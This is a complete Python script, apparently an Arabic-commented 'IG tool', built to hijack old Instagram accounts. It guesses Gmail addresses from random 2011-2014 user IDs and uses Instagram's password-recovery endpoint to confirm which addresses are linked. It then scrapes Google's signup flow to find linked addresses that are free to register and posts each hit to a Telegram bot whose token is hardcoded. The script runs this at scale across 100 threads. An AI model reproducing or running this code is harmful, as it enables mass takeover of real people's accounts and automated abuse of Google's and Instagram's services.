import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import sys
import string
import json
from threading import Thread
from rich.console import Console

# Note: Ensure 'ethan' and 'asmix' are installed in your environment
try:
    import ethan
    from asmix import Instagram
except ImportError:
    pass

Con = Console()
Ex = 0

#=============================#
hits = 0
bads_instagram = 0
bads_email = 0
p1 = 0
#=============================#

# ANSI Color Codes
Z = '\033[1;31m'   # Red
b = random.randint(5, 208)
bo = f'\x1b[38;5;{b}m'
Z1 = '\033[2;31m'  # Dark Red
F = '\033[2;32m'   # Green
A = '\033[2;34m'   # Blue
C = '\033[1;97m'   # White
J = '\033[2;36m'   # Cyan
Y = '\033[1;34m'   # Light Blue
X = '\033[1;33m'   # Yellow
M = '\x1b[1;37m'   # White
S = '\033[1;33m'   # Yellow
R = '\033[1;31m'   # Red
C1 = '\033[2;35m'  # Pink
H = '\x1b[38;5;208m' # Orange
ED = '\x1b[38;5;208m'# Orange
Bl = '\033[1;34m'  # Blue
P = '\033[1;35m'   # Purple
G = '\033[1;32m'   # Green
N = '\033[1;37m'   # White

#=============================#

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = render('{WARRIOR}', colors=['red', 'white'], align='center')
    print(logo)
    print(f'''{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DIS / dis.gg/nt4{R} | {N}id / @008y{R} | {N}PROGRAMMER / #NovaTeam
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
    print(f'''{N}                WELCOME TO NovaTeam IG TOOL       
    
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')

banner()

# تم وضع الأيدي والتوكن الخاص بك هنا مباشرة مسبقاً
ID = "8368093591"
token = "8781335363:AAHquFRhQNYeXdKrVONEHq0PmMAfLX2JAjc"

print(f"{ED}TELEGRAM ID SET     : {ID}")
print(f"{P}BOT TOKEN SET       : {token[:10]}...")
print('')
print(f'''
{N}[1] {Y}- {R}START CHECKING (2011 - 2014 ACCOUNTS)
''')
wr = int(input(f'{Y}SELECT OPTION : {N}'))

if wr == 1:
    pass

os.system('cls' if os.name == 'nt' else 'clear')

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
ids = []

def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        
        he3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": str(gg()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'user-agent': gg(),
        }
        data = {
            'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = pp('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers, data=data)
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        try: os.remove('tl.txt')
        except: pass
        
        with open('tl.txt', 'a') as f:
            f.write(tl + '//' + host + '\n')
    except Exception as e:
        tll()

tll()

def check_gmail(email):
    if '@' in email:
        email = str(email).split('@')[0]
    try:
        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            tll()
            o = open('tl.txt', 'r').read().splitlines()[0]
        
        tl, host = o.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': gg(),
        }
        params = {'TL': tl}
        data = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        
        response = pp('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data)
        
        if '"gf.uar",1' in str(response.text): return 'good'
        elif '"er",null,null,null,null,400' in str(response.text):
            tll()
            return check_gmail(email)
        else: return 'bad'
    except: return check_gmail(email)

def info(username, jj):
    global hits
    hits += 1
    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*"
        }
        
        response = requests.get(url, headers=headers)
        data = response.json()
        user = data['data']['user']
        
        name = user["full_name"]
        followers = user["edge_followed_by"]["count"]
        following = user["edge_follow"]["count"]
        posts = user["edge_owner_to_timeline_media"]["count"]
        
        try:
            ddd = Instagram.date(user['id'])
            rest = Instagram.rest(username)
        except:
            ddd = "Unknown"
            rest = "Unknown"

        ff = f"""
    New Hit IG Account! (2011-2014)
    ════════════════
    Username  : @{username}
    Name      : {name}
    Email     : {username}@{jj}
    Date      : {ddd}
    Posts     : {posts}
    Followers : {followers}
    Following : {following}
    Rest      : {rest}
    ════════════════
    By @0ld.warrior
        """
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
    except:
        try: rest = Instagram.rest(username)
        except: rest = "Unknown"
        ff = f"""
    New Hit IG Account! (2011-2014)
    ════════════════
    Username  : @{username}
    Email     : {username}@{jj}
    Rest      : {rest}
    URL       : https://www.instagram.com/{username}
    ════════════════
    By @0ld.warrior
        """
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")

def bmw(email):
    global bads_email
    try:
        if 'good' == check_gmail(email):
            username, jj = email.split('@')
            info(username, jj)
        else: bads_email += 1
    except: pass

def check(email):
    global bads_instagram, hits, bads_email
    try:
        headers = {
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
            'ig_sig_key_version': '4',
        }

        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
         
        if '"status":"ok"' in respon: 
            bmw(email)
        else: 
            bads_instagram += 1
    except: pass
    
    bi = random.randint(5, 208)
    bos = f'\x1b[38;5;{bi}m'
    
    status_line = (f"\r{bo} Hits: {hits} | {M}Bad Mail: {bads_email} | {Z}Bad Insta: {bads_instagram} | Current: {email}")
    sys.stdout.write(status_line)
    sys.stdout.flush()

def Users():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        # نطاق الآيديسترول الشامل لحسابات 2011 إلى 2014
        UseriD = str(random.randrange(180165130, 1682665388))
        
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        
        username = response.json()['data']['user']['username']
        email = username + '@gmail.com'
        check(email)
        Ex += 1
        return username
    except:
        return None

def ExUsers():
    for _ in range(1000):  
        Users()

threads = []
for _ in range(100): 
    thread = Thread(target=ExUsers)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print(f"\n\nDone! Total Users Processed: {Ex}")
